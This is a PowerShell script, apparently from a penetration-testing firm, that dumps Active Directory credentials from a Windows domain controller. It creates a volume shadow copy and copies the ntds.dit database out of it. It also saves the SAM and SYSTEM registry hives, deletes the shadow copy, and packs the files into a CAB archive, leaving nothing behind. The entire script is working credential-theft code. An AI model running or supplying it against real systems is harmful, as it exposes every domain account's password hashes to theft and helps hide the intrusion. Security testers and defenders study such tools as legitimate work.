#Complete script created by Koen Riepe (koen.riepe@fox-it.com)
#New-CabinetFile originally by Iain Brighton: http://virtualengine.co.uk/2014/creating-cab-files-with-powershell/
function New-CabinetFile {
    [CmdletBinding()]
    Param(
        [Parameter(HelpMessage="Target .CAB file name.", Position=0, Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("FilePath")]
        [string] $Name,
 
        [Parameter(HelpMessage="File(s) to add to the .CAB.", Position=1, Mandatory=$true, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("FullName")]
        [string[]] $File,
 
        [Parameter(HelpMessage="Default intput/output path.", Position=2, ValueFromPipelineByPropertyName=$true)]
        [AllowNull()]
        [string[]] $DestinationPath,
 
        [Parameter(HelpMessage="Do not overwrite any existing .cab file.")]
        [Switch] $NoClobber
        )
 
    Begin { 
    
        ## If $DestinationPath is blank, use the current directory by default
        if ($DestinationPath -eq $null) { $DestinationPath = (Get-Location).Path; }
        Write-Verbose "New-CabinetFile using default path '$DestinationPath'.";
        Write-Verbose "Creating target cabinet file '$(Join-Path $DestinationPath $Name)'.";
 
        ## Test the -NoClobber switch
        if ($NoClobber) {
            ## If file already exists then throw a terminating error
            if (Test-Path -Path (Join-Path $DestinationPath $Name)) { throw "Output file '$(Join-Path $DestinationPath $Name)' already exists."; }
        }
 
        ## Cab files require a directive file, see 'http://msdn.microsoft.com/en-us/library/bb417343.aspx#dir_file_syntax' for more info
        $ddf = ";*** MakeCAB Directive file`r`n";
        $ddf += ";`r`n";
        $ddf += ".OPTION EXPLICIT`r`n";
        $ddf += ".Set CabinetNameTemplate=$Name`r`n";
        $ddf += ".Set DiskDirectory1=$DestinationPath`r`n";
        $ddf += ".Set MaxDiskSize=0`r`n";
        $ddf += ".Set Cabinet=on`r`n";
        $ddf += ".Set Compress=on`r`n";
        ## Redirect the auto-generated Setup.rpt and Setup.inf files to the temp directory
        $ddf += ".Set RptFileName=$(Join-Path $ENV:TEMP "setup.rpt")`r`n";
        $ddf += ".Set InfFileName=$(Join-Path $ENV:TEMP "setup.inf")`r`n";
 
        ## If -Verbose, echo the directive file
        if ($PSCmdlet.MyInvocation.BoundParameters["Verbose"].IsPresent) {
            foreach ($ddfLine in $ddf -split [Environment]::NewLine) {
                Write-Verbose $ddfLine;
            }
        }
    }
 
    Process {
   
        ## Enumerate all the files add to the cabinet directive file
        foreach ($fileToAdd in $File) {
        
            ## Test whether the file is valid as given and is not a directory
            if (Test-Path $fileToAdd -PathType Leaf) {
                Write-Verbose """$fileToAdd""";
                $ddf += """$fileToAdd""`r`n";
            }
            ## If not, try joining the $File with the (default) $DestinationPath
            elseif (Test-Path (Join-Path $DestinationPath $fileToAdd) -PathType Leaf) {
                Write-Verbose """$(Join-Path $DestinationPath $fileToAdd)""";
                $ddf += """$(Join-Path $DestinationPath $fileToAdd)""`r`n";
            }
            else { Write-Warning "File '$fileToAdd' is an invalid file or container object and has been ignored."; }
        }       
    }
 
    End {
    
        $ddfFile = Join-Path $DestinationPath "$Name.ddf";
        $ddf | Out-File $ddfFile -Encoding ascii | Out-Null;
 
        Write-Verbose "Launching 'MakeCab /f ""$ddfFile""'.";
        $makeCab = Invoke-Expression "MakeCab /F ""$ddfFile""";
 
        ## If Verbose, echo the MakeCab response/output
        if ($PSCmdlet.MyInvocation.BoundParameters["Verbose"].IsPresent) {
            ## Recreate the output as Verbose output
            foreach ($line in $makeCab -split [environment]::NewLine) {
                if ($line.Contains("ERROR:")) { throw $line; }
                else { Write-Verbose $line; }
            }
        }
 
        ## Delete the temporary .ddf file
        Write-Verbose "Deleting the directive file '$ddfFile'.";
        Remove-Item $ddfFile;
 
        ## Return the newly created .CAB FileInfo object to the pipeline
        Get-Item (Join-Path $DestinationPath $Name);
    }
}

$key = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
$ntdsloc = (Get-ItemProperty -Path $key -Name "DSA Database file")."DSA Database file"
$ntdspath = $ntdsloc.split(":")[1]
$ntdsdisk = $ntdsloc.split(":")[0]

(Get-WmiObject -list win32_shadowcopy).create($ntdsdisk + ":\","ClientAccessible")

$id_shadow = "None"
$volume_shadow = "None"

if (!(Get-WmiObject win32_shadowcopy).length){
    Write-Host "Only one shadow clone"
    $id_shadow = (Get-WmiObject win32_shadowcopy).ID
    $volume_shadow = (Get-WmiObject win32_shadowcopy).DeviceObject
} Else {
    $n_shadows = (Get-WmiObject win32_shadowcopy).length-1
    $id_shadow = (Get-WmiObject win32_shadowcopy)[$n_shadows].ID
    $volume_shadow = (Get-WmiObject win32_shadowcopy)[$n_shadows].DeviceObject
}

$command = "cmd.exe /c copy "+ $volume_shadow + $ntdspath + " " + ".\ntds.dit"
iex $command

$command2 = "cmd.exe /c reg save HKLM\SYSTEM .\SYSTEM"
iex $command2

$command3 = "cmd.exe /c reg save HKLM\SAM .\SAM"
iex $command3

(Get-WmiObject -Namespace root\cimv2 -Class Win32_ShadowCopy | Where-Object {$_.DeviceObject -eq $volume_shadow}).Delete()
if (Test-Path "All.cab"){
   Remove-Item "All.cab" 
}
New-CabinetFile -Name All.cab -File "SAM","SYSTEM","ntds.dit"
Remove-Item ntds.dit
Remove-Item SAM
Remove-Item SYSTEM
